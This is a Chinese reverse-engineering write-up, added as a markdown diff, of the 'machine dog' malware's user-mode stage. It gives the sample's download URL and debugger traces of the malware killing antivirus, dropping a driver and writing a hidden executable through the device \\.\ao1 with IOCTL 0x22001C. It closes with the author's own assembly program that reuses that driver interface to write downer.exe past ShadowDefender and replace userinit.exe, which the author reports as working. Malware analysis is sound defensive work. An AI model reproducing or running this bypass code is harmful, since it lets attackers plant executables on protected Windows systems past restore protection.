@@ -1,0 +1,233 @@
+
+# 机器狗病毒 RING3 层分析
+
+> 原文：[`www.pediy.com/kssd/pediy12/95784.html`](https://www.pediy.com/kssd/pediy12/95784.html)
+
+这篇文章中的病毒样本是看雪论坛中的，参考 『我懂技术我做主』>>>【原创】最新机器狗变种分析 `gr.exe` >>>`http://{blocked}www.hoho-2.cn/down/gr.exe`
+
+看在他穿透了我的影子卫士的份上，所以此文诞生了。
+
+`[工具]`：`peid`, `od`
+
+`[病毒介绍]`： 当然是机器狗了（别问我是不是 `SONY` 的那个机器狗宝宝！！）。
+
+`[开始]`
+
+查壳，`upx` 的壳，脱壳机直接上。
+
+`od` 载入，第一个 `call` 是解密代码，过，看见
+
+```
+push 403991
+ret
+```
+
+这是真正的入口点，`f8` 步入到这，发现是乱码，`ctrl+a`，`ok`
+
+`f8` 到这
+
+```
+004039E5  |.  6A 01            PUSH 1                      ; |InitialOwner = TRUE
+004039E7  |.  53             PUSH EBX                      ; |pSecurity => NULL
+004039E8  |.  FF15 64104000  CALL DWORD PTR DS:[<&KERNEL32.CreateMute>; \CreateMutexA
+004039EE  |.  FF15 60104000  CALL DWORD PTR DS:[<&KERNEL32.GetLastErr>; [GetLastError
+004039F4  |.  3D B7000000    CMP EAX,0B7
+004039F9  |.  75 07          JNZ SHORT gr(1).00403A02
+004039FB  |.  53             PUSH EBX                      ; /ExitCode => 0
+004039FC  |.  FF15 5C104000  CALL DWORD PTR DS:[<&KERNEL32.ExitProces>; \ExitProcess
+```
+
+直接 `JMP` 跳出，继续运行。
+
+到此
+
+```
+004039FC  |.  FF15 5C104000  CALL DWORD PTR DS:[<&KERNEL32.ExitProces>; \ExitProcess
+00403A02  |>  57             PUSH EDI
+00403A03  |.  E8 550A0000    CALL gr(1).0040445D
+00403A08  |.  E8 65050000    CALL gr(1).00403F72
+00403A0D  |.  E8 FC050000    CALL gr(1).0040400E
+00403A12  |.  8B35 A8104000  MOV ESI,DWORD PTR DS:[<&KERNEL32.Sleep>]  ;  kernel32.Sleep
+```
+
+第一个 `call` 没出错但第二个 `call` 出错了，看代码不重要，所以我 `nop` 掉它。
+
+第三个 `call` 是运行 `taskkill` `ekrn.exe`。`ekrn.exe` 是 `ESET Smart Security` 反病毒软件相关程序，不过 `od` 进入 `ShellExecuteA` 出错了就又把 它给 `nop` 掉的。
+
+```
+00403A18  |.  BF B80B0000    MOV EDI,0BB8
+00403A1D  |.  57             PUSH EDI                      ; /Timeout => 3000. ms
+00403A1E  |.  FFD6           CALL ESI                      ; \Sleep
+```
+
+哈哈，看到 `sleep` 了，作者终于开始干了（将心比心）。
+
+下面马上来了一个 `call`，跟入
+
+```
+00403914  |.  8B3D 54104000  MOV EDI,DWORD PTR DS:[<&KERNEL32.GetTick>;  kernel32.GetTickCount
+0040391A  |.  FFD7           CALL EDI                      ; [GetTickCount
+0040391C  |.  83C0 16        ADD EAX,16
+0040391F  |.  8B1D FC104000  MOV EBX,DWORD PTR DS:[<&USER32.wsprintfA>;  USER32.wsprintfA
+00403925  |.  50             PUSH EAX
+00403926  |.  8D45 90        LEA EAX,DWORD PTR SS:[EBP-70]
+00403929  |.  50             PUSH EAX
+0040392A  |.  8D45 F4        LEA EAX,DWORD PTR SS:[EBP-C]
+0040392D  |.  BE CC454000    MOV ESI,gr(1).004045CC        ;  ASCII "C:\DOCUME~1\ADMINI~1\LOCALS~1
+\Temp\~4fbf84.tmp"
+00403932  |.  50             PUSH EAX                        ; |Format
+00403933  |.  56             PUSH ESI                        ; |s => gr(1).004045CC
+00403934  |.  FFD3           CALL EBX                        ; \wsprintfA
+00403936  |.  56             PUSH ESI
+00403937  |.  68 10344000   PUSH gr(1).00403410             ;  ASCII "ico"
+0040393C  |.  68 0C344000   PUSH gr(1).0040340C
+00403941  |.  E8 6AFEFFFF    CALL gr(1).004037B0
+```
+
+病毒用 `windows` 启动时间来做文件名，释放驱动到临时目录，终于让我逮到了，`peid` 查壳，居然说无效的文件，别着急，小技巧而已，用 `UEDIT` 打开，居然 `MZ` 只剩下 `M` 了，加上 `Z`，`OK` 搞定。
+
+它还释放了另外一个病毒文件，不管他了。
+
+```
+00403715  |.  BE CC454000    MOV ESI,gr(1).004045CC        ;  ASCII "C:\DOCUME~1\ADMINI~1\LOCALS~1
+\Temp\~5785c0.tmp"
+0040371A  |.  56             PUSH ESI
+0040371B  |.  E8 4EFFFFFF    CALL gr(1).0040366E
+00403720  |.  59             POP ECX
+00403721  |.  FF35 D8464000  PUSH DWORD PTR DS:[4046D8]
+00403727  |.  FF15 08104000  CALL DWORD PTR DS:[<&ADVAPI32.CloseServi>;  ADVAPI32.CloseServiceHandle
+0040372D  |.  57             PUSH EDI                      ; /hTemplateFile
+0040372E  |.  57             PUSH EDI                      ; |Attributes
+0040372F  |.  6A 03          PUSH 3                        ; |Mode = OPEN_EXISTING
+00403731  |.  57             PUSH EDI                      ; |pSecurity
+00403732  |.  57             PUSH EDI                      ; |ShareMode
+00403733  |.  8D45 F8        LEA EAX,DWORD PTR SS:[EBP-8]    ; |
+00403736  |.  68 00000080   PUSH 80000000                  ; |Access = GENERIC_READ
+0040373B  |.  50             PUSH EAX                      ; |FileName
+0040373C  |.  FF15 B0104000  CALL DWORD PTR DS:[<&KERNEL32.CreateFile>; \CreateFileA
+```
+
+第一个 `call` 是加载驱动的，到了 `CreateFile`，发现是
+
+```
+0012FE2C   00403742  gr(1).00403742
+0012FE30   0012FF60  ASCII "\\\\.\\ao1"
+0012FE34   80000000
+```
+
+`\\\\.\\ao1`，就是他了，这只坏老鼠（驱动）打的洞（链接符合），来吧，让我逮你吧！！！！
+
+```
+0012FE2C   00000094  |hDevice = 00000094 (window)
+0012FE30   0022001C  |IoControlCode = 22001C
+0012FE34   00407AA0  |InBuffer = gr(1).00407AA0
+0012FE38   00001A00  |InBufferSize = 1A00 (6656.)
+0012FE3C   00000000  |OutBuffer = NULL
+0012FE40   00000000  |OutBufferSize = 0
+0012FE44   0012FF5C  |pBytesReturned = 0012FF5C
+0012FE48   00000000  \pOverlapped = NULL
+00403774  |.  FF15 B8104000 CALL DWORD PTR DS:[<&KERNEL32.DeviceIoCo>; \DeviceIoControl
+```
+
+`DeviceIoControl`，再熟悉不过了，堆饯中是参数，咦 `inbuffer` 是什么东西呀，看内存吧，
+
+```
+00407AA0  4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ?........
+00407AB0  B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ?......@.......
+00407AC0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+00407AD0  00 00 00 00 00 00 00 00 00 00 00 00 D8 00 00 00  ........?..
+00407AE0  0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68  ?.???L?Th
+00407AF0  69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F  is program canno
+00407B00  74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20  t be run in DOS
+00407B10  6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00  mode....$.......
+```
+
+靠，程序耶，应该是一个下载者吧（重启后，的确是），那 `size` 不就是 `exe` 的文件长度了？？？
+
+都到了这个地步，完成 `DeviceIoControl`，穿透就完成了！！！！
+
+接下来，上菜！！！
+
+```
+.386
+
+.model flat,stdcall
+
+option casemap:none
+
+include windows.inc
+
+include kernel32.inc
+
+includelib kernel32.lib
+
+include user32.inc
+
+includelib user32.lib
+
+.data
+
+szFileName db "downer.exe",0
+
+lpLink db "\\\\.\\ao1",0
+
+lpout dd 0
+
+lpOpene db "open file error ",0
+
+@dwFileSize dd 0
+
+.code
+
+mapfile proc
+
+LOCAL @hFile,@hMapFile
+
+  invoke  CreateFile,addr szFileName,GENERIC_READ,FILE_SHARE_READ or \
+      FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,NULL
+    .if  eax !=  INVALID_HANDLE_VALUE
+      mov  @hFile,eax
+      invoke  GetFileSize,eax,NULL
+      mov  @dwFileSize,eax
+      .if  eax
+        invoke  CreateFileMapping,@hFile,NULL,PAGE_READONLY,0,0,NULL
+        .if  eax
+          mov  @hMapFile,eax
+          invoke  MapViewOfFile,eax,FILE_MAP_READ,0,0,0
+        .endif
+      .endif
+    .endif    
+
+  ret
+
+mapfile endp
+
+start:
+
+work proc
+
+invoke CreateFile,offset lpLink, GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0
+
+push eax
+
+call mapfile    ;注意堆饯
+
+pop ecx
+
+invoke DeviceIoControl,ecx,22001ch,eax,@dwFileSize,0,0,offset lpout,0
+
+invoke ExitProcess,0
+
+work endp
+
+end start
+```
+
+尾声：
+
+1. 注意 穿的文件(`downer.exe`)要小于被穿的文件(`userinit.exe`)
+2. 驱动的加载用 `KMD`。
+3. 盗版 `xpsp3`+`ShadowDefender` 能防机器狗的还原软件 `V1.1.0.278` 汉化纯净安装版+此代码=成功
+4. 最后码码快来。
+
+******程序写得很危险（没除错过程），别学 `ME` 哦！！！！！！！！！！！！！
